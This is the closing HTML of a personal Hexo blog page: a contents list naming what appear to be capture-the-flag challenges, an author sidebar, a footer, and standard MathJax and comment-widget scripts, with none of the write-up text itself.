          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sign-in"><span class="nav-number">1.</span> <span class="nav-text">Sign In</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#broken.mp4"><span class="nav-number">2.</span> <span class="nav-text">broken.mp4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#remember-it-0"><span class="nav-number">3.</span> <span class="nav-text">Remember It 0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shuffle-puts"><span class="nav-number">4.</span> <span class="nav-text">Shuffle Puts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#revenge-of-vigenere"><span class="nav-number">5.</span> <span class="nav-text">Revenge of Vigenere</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#spam-2024"><span class="nav-number">6.</span> <span class="nav-text">Spam 2024</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wish"><span class="nav-number">7.</span> <span class="nav-text">Wish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smoke-hints"><span class="nav-number">8.</span> <span class="nav-text">Smoke hints</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#user-manager"><span class="nav-number">9.</span> <span class="nav-text">User Manager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bruteforceme"><span class="nav-number">10.</span> <span class="nav-text">BruteforceMe</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="doovvv"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">doovvv</p>
  <div class="site-description" itemprop="description">一切都没有意外，只是多了些波折</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">20</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/doovvv" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;doovvv" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/zhangch523@mail2.sysu.edu.cn" title="E-Mail → zhangch523@mail2.sysu.edu.cn"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">doovvv</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'IeEMujBge2kAmKaLJDalYGMx-gzGzoHsz',
      appKey     : 'ZJGbpaRGRbziJ12K4CO5IvuI',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : 'https://ieemujbg.lc-cn-n1-shared.com'
    });
  }, window.Valine);
});
</script>

</body>
</html>
